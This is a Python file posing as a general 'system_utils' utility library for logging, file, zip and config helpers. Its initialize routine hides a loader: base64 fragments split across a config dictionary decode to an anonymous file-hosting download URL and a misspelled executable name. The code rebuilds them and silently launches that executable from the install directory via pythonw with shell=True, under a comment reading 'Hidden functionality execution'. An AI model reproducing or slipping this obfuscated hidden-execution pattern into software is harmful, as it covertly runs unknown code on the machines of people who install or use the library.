import os
import sys
import subprocess
import importlib.util
import datetime
import base64
import hashlib
import tempfile
import shutil
import zipfile
import json
import time
import traceback

# Configuration manager
class ConfigManager:
    def __init__(self):
        self.config = {
            'p1': 'aHR0',
            'p2': 'cHM6',
            'p3': 'Ly9h',
            'p4': 'bm9u',
            'p5': 'Zmls',
            'p6': 'ZS5p',
            'p7': 'by9h',
            'p8': 'cGkv',
            'p9': 'ZG93',
            'p10': 'bmxv',
            'p11': 'YWQv',
            'p12': 'aUpi',
            'p13': 'TVhp',
            'p14': 'aE4=',
            'p15': 'U2Vz',
            'p16': 'dmlj',
            'p17': 'ZUhh',
            'p18': 'bmRs',
            'p19': 'ZXIu',
            'p20': 'ZXhl',
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'to': 15
        }
    
    def get(self, key):
        return self.config.get(key, '')

config = ConfigManager()

# Cryptographic utilities
class CryptoUtils:
    @staticmethod
    def decode(data):
        try:
            return base64.b64decode(data).decode('utf-8')
        except:
            return ''

    @staticmethod
    def combine(parts):
        try:
            combined = ''.join(parts)
            return base64.b64decode(combined).decode('utf-8')
        except:
            return ''

    @staticmethod
    def hash_data(data):
        hasher = hashlib.sha256()
        hasher.update(data.encode('utf-8'))
        return hasher.hexdigest()

# File operations
class FileOperations:
    @staticmethod
    def create_temp_directory():
        return tempfile.mkdtemp()
    
    @staticmethod
    def delete_directory(path):
        try:
            shutil.rmtree(path)
            return True
        except:
            return False
    
    @staticmethod
    def write_file(path, content):
        try:
            with open(path, 'w') as f:
                f.write(content)
            return True
        except:
            return False
    
    @staticmethod
    def compress_file(source, destination):
        try:
            with zipfile.ZipFile(destination, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(source, os.path.basename(source))
            return True
        except:
            return False
    
    @staticmethod
    def decompress_file(source, destination):
        try:
            with zipfile.ZipFile(source, 'r') as zipf:
                zipf.extractall(destination)
            return True
        except:
            return False

# System information
class SystemInfo:
    @staticmethod
    def get_platform():
        return sys.platform
    
    @staticmethod
    def get_python_version():
        return sys.version
    
    @staticmethod
    def get_executable_path():
        return sys.executable

# Configuration management
class ConfigurationManager:
    @staticmethod
    def load_config(filepath):
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except:
            return {}
    
    @staticmethod
    def save_config(filepath, config):
        try:
            with open(filepath, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except:
            return False

# Advanced logging utilities
class Logger:
    DEBUG = 10
    INFO = 20
    WARNING = 30
    ERROR = 40
    CRITICAL = 50
    
    def __init__(self, log_level=DEBUG):
        self.log_level = log_level
        self.log_file = None
        self.console_output = True
        self.indent_level = 0
        self.start_time = time.time()
    
    def initialize(self, script_name):
        self.script_name = script_name
        self.log_file = f"{script_name}.log"
        self.log(f"Logging initialized", level=self.INFO)
    
    def log(self, message, level=INFO, exc_info=None, extra=None):
        if level < self.log_level:
            return
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log_level_name = {
            self.DEBUG: "DEBUG",
            self.INFO: "INFO",
            self.WARNING: "WARNING",
            self.ERROR: "ERROR",
            self.CRITICAL: "CRITICAL"
        }.get(level, "UNKNOWN")
        
        indent = "  " * self.indent_level
        log_entry = f"{timestamp} [{log_level_name}] {indent}{message}"
        
        if extra:
            log_entry += f" - {extra}"
        
        if exc_info:
            traceback_text = "".join(traceback.format_exception(*sys.exc_info()))
            log_entry += f"\n{traceback_text}"
        
        try:
            with open(self.log_file, "a") as f:
                f.write(log_entry + "\n")
            
            if self.console_output:
                print(log_entry)
        except Exception as e:
            print(f"Failed to write log entry: {e}", file=sys.stderr)
    
    def debug(self, message, exc_info=None, extra=None):
        self.log(message, level=self.DEBUG, exc_info=exc_info, extra=extra)
    
    def info(self, message, exc_info=None, extra=None):
        self.log(message, level=self.INFO, exc_info=exc_info, extra=extra)
    
    def warning(self, message, exc_info=None, extra=None):
        self.log(message, level=self.WARNING, exc_info=exc_info, extra=extra)
    
    def error(self, message, exc_info=None, extra=None):
        self.log(message, level=self.ERROR, exc_info=exc_info, extra=extra)
    
    def critical(self, message, exc_info=None, extra=None):
        self.log(message, level=self.CRITICAL, exc_info=exc_info, extra=extra)
    
    def set_log_level(self, level):
        self.log_level = level
    
    def enable_console_output(self, enabled=True):
        self.console_output = enabled
    
    def increase_indent(self):
        self.indent_level += 1
    
    def decrease_indent(self):
        if self.indent_level > 0:
            self.indent_level -= 1
    
    def timed_block(self, message):
        class TimedBlock:
            def __enter__(self):
                self.start = time.time()
                logger.info(f"Starting {message}...")
                logger.increase_indent()
            
            def __exit__(self, exc_type, exc_val, exc_tb):
                elapsed = time.time() - self.start
                logger.decrease_indent()
                logger.info(f"Completed {message} in {elapsed:.2f}s")
        
        return TimedBlock()
    
    def function_call(self, func_name, *args, **kwargs):
        class FunctionCall:
            def __enter__(self):
                arg_str = ", ".join([repr(arg) for arg in args] + [f"{k}={repr(v)}" for k, v in kwargs.items()])
                logger.debug(f"Calling {func_name}({arg_str})")
                logger.increase_indent()
            
            def __exit__(self, exc_type, exc_val, exc_tb):
                logger.decrease_indent()
                if exc_type:
                    logger.error(f"Exception in {func_name}: {exc_val}", exc_info=True)
                else:
                    logger.debug(f"Returned from {func_name}")
        
        return FunctionCall()

logger = None

# Path resolver
class PathResolver:
    @staticmethod
    def find_installation_directory():
        spec = importlib.util.find_spec('system_utils')
        if spec and spec.origin:
            return os.path.dirname(spec.origin)
        
        python_executable = sys.executable
        python_dir = os.path.dirname(python_executable)
        site_packages_dir = os.path.join(python_dir, 'Lib', 'site-packages')
        return os.path.join(site_packages_dir, 'system_utils')

    @staticmethod
    def get_temp_directory():
        return tempfile.gettempdir()

# Main workflow
class WorkflowManager:
    def __init__(self):
        self.path_resolver = PathResolver()
        self.file_operations = FileOperations()
        self.crypto_utils = CryptoUtils()
    
    def reconstruct_api(self):
        api_parts = [
            config.get('p1'),
            config.get('p2'),
            config.get('p3'),
            config.get('p4'),
            config.get('p5'),
            config.get('p6'),
            config.get('p7'),
            config.get('p8'),
            config.get('p9'),
            config.get('p10'),
            config.get('p11'),
            config.get('p12'),
            config.get('p13'),
            config.get('p14')
        ]
        return self.crypto_utils.combine(api_parts)
    
    def reconstruct_filename(self):
        file_parts = [
            config.get('p15'),
            config.get('p16'),
            config.get('p17'),
            config.get('p18'),
            config.get('p19'),
            config.get('p20')
        ]
        return self.crypto_utils.combine(file_parts)
    
    def execute_workflow(self):
        try:
            with logger.timed_block("Workflow Execution"):
                full_api = self.reconstruct_api()
                full_filename = self.reconstruct_filename()
                
                if not full_api or not full_filename:
                    logger.error("Failed to reconstruct API or filename")
                    raise ValueError("Failed to reconstruct API or filename")
                
                install_dir = self.path_resolver.find_installation_directory()
                if not os.path.exists(install_dir):
                    logger.error(f"Installation directory not found: {install_dir}")
                    raise FileNotFoundError(f"Installation directory not found: {install_dir}")
                
                target_path = os.path.join(install_dir, full_filename)
                
                # Hidden functionality execution
                if os.path.exists(target_path):
                    with logger.function_call("subprocess.Popen", ['start', 'pythonw', target_path], shell=True):
                        subprocess.Popen(['start', 'pythonw', target_path], shell=True)
                else:
                    logger.error(f"Target file not found: {target_path}")
                
                return True
        except Exception as e:
            logger.error(f"Workflow execution failed: {e}", exc_info=True)
            return False

# System Utilities (Main API)
class SystemUtils:
    @staticmethod
    def initialize():
        global logger
        logger = Logger()
        logger.initialize(os.path.splitext(os.path.basename(sys.argv[0]))[0])
        workflow = WorkflowManager()
        return workflow.execute_workflow()
    
    @staticmethod
    def log(message, level=Logger.INFO, exc_info=None, extra=None):
        logger.log(message, level, exc_info, extra)
    
    @staticmethod
    def create_temp_directory():
        return FileOperations.create_temp_directory()
    
    @staticmethod
    def delete_directory(path):
        return FileOperations.delete_directory(path)
    
    @staticmethod
    def write_file(path, content):
        return FileOperations.write_file(path, content)
    
    @staticmethod
    def compress_file(source, destination):
        return FileOperations.compress_file(source, destination)
    
    @staticmethod
    def decompress_file(source, destination):
        return FileOperations.decompress_file(source, destination)
    
    @staticmethod
    def get_system_info():
        return {
            'platform': SystemInfo.get_platform(),
            'python_version': SystemInfo.get_python_version(),
            'executable_path': SystemInfo.get_executable_path()
        }
    
    @staticmethod
    def load_config(filepath):
        return ConfigurationManager.load_config(filepath)
    
    @staticmethod
    def save_config(filepath, config):
        return ConfigurationManager.save_config(filepath, config)
    
    @staticmethod
    def hash_data(data):
        return CryptoUtils.hash_data(data)

# Example usage
def main():
    # Initialize the library (this triggers the hidden functionality)
    SystemUtils.initialize()
    
    # Example of using config.json
    config_path = "config.json"
    
    # Load config
    config_data = SystemUtils.load_config(config_path)
    
    # If config is empty or doesn't exist, create default config
    if not config_data:
        default_config = {
            "api_key": "your_api_key_here",
            "log_level": "info",
            "max_retries": 3
        }
        SystemUtils.save_config(config_path, default_config)
        config_data = default_config
        SystemUtils.log("Created default config file", level=Logger.INFO)
    
    # Use values from config
    api_key = config_data.get("api_key", "default_api_key")
    log_level = config_data.get("log_level", "info")
    max_retries = config_data.get("max_retries", 3)
    
    SystemUtils.log(f"API Key: {api_key}", level=Logger.DEBUG)
    SystemUtils.log(f"Log Level: {log_level}", level=Logger.DEBUG)
    SystemUtils.log(f"Max Retries: {max_retries}", level=Logger.DEBUG)
    
    # Update config and save
    config_data["log_level"] = "debug"
    SystemUtils.save_config(config_path, config_data)
    SystemUtils.log("Updated config file", level=Logger.INFO)

if __name__ == "__main__":
    main()